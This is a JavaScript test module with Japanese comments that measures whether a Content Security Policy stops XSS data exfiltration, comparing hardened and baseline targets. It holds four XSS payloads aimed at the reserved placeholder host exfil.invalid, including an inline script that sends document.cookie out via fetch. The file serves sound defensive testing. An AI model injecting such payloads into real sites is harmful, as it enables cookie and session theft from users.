/**
 * 実験 E8 で注入するペイロードと、結果の判定(CSP による XSS 影響範囲の検証)。
 *
 * 測るのは「XSS が起きるか」ではなく **「起きたときに外部ドメインへ情報を
 * 送信できるか」**。CSP は注入そのものは止められないが、`default-src 'none'` の
 * 下では外部への送信(exfiltration)が止まる。その差を hardened / baseline で比べる。
 *
 * ペイロードは自ドメイン外への通信を試みるが、**送信先は存在しないホスト**にする。
 * 実在するサイトへリクエストを飛ばさないため(第三者に迷惑をかけない)。
 */

/** 存在しないことが保証されている送信先(RFC 6761 の予約 TLD) */
export const EXFIL_HOST = "exfil.invalid";

export const PAYLOADS = [
  {
    id: "img-src",
    description: "img タグで外部ドメインへ GET(img-src で止まるか)",
    // onerror を使わず純粋にリソース取得だけを試す
    html: `<img src="https://${EXFIL_HOST}/steal?c=1">`,
    expectedBlockedDirective: "img-src",
  },
  {
    id: "inline-script",
    description: "inline script の実行(script-src 'self' で止まるか)",
    html: `<script>fetch("https://${EXFIL_HOST}/steal?c="+document.cookie)</script>`,
    expectedBlockedDirective: "script-src",
  },
  {
    id: "svg-onload",
    description: "svg の onload によるイベントハンドラ実行",
    html: `<svg onload="fetch('https://${EXFIL_HOST}/steal')"></svg>`,
    expectedBlockedDirective: "script-src",
  },
  {
    id: "form-action",
    description: "外部ドメインへのフォーム送信(form-action で止まるか)",
    html: `<form action="https://${EXFIL_HOST}/steal" method="POST"><input name="c" value="1"></form>`,
    expectedBlockedDirective: "form-action",
  },
];

/**
 * `?q=` に載せる形にエンコードする。
 * @param {{ html: string }} payload
 */
export function toQueryValue(payload) {
  return encodeURIComponent(payload.html);
}

/**
 * ブラウザの観測結果から「外部への送信が成立したか」を判定する。
 *
 * @param {{ payloadId: string, target: string,
 *           requests: string[], consoleErrors: string[] }} observation
 */
export function evaluateObservation(observation) {
  const exfilAttempted = observation.requests.some((url) => url.includes(EXFIL_HOST));
  const cspViolationLogged = observation.consoleErrors.some((message) =>
    /content security policy/i.test(message),
  );

  return {
    payload: observation.payloadId,
    target: observation.target,
    // 外部ホストへリクエストが出た = 送信が成立した
    exfiltration_succeeded: exfilAttempted ? 1 : 0,
    csp_violation_logged: cspViolationLogged ? 1 : 0,
    console_errors: observation.consoleErrors.length,
  };
}

/**
 * hardened / baseline の比較行。**片方しか無ければ差分を作らない**(SPEC 6)。
 */
export function compareTargets(rows) {
  const byPayload = new Map();
  for (const row of rows) {
    const entry = byPayload.get(row.payload) ?? { payload: row.payload };
    entry[`${row.target}_exfiltration`] = row.exfiltration_succeeded;
    entry[`${row.target}_csp_violation`] = row.csp_violation_logged;
    byPayload.set(row.payload, entry);
  }

  return [...byPayload.values()].map((entry) => ({
    ...entry,
    // baseline で成立し hardened で止まった = CSP が効いた
    blocked_by_csp:
      entry.baseline_exfiltration === undefined || entry.hardened_exfiltration === undefined
        ? ""
        : entry.baseline_exfiltration === 1 && entry.hardened_exfiltration === 0
          ? 1
          : 0,
  }));
}
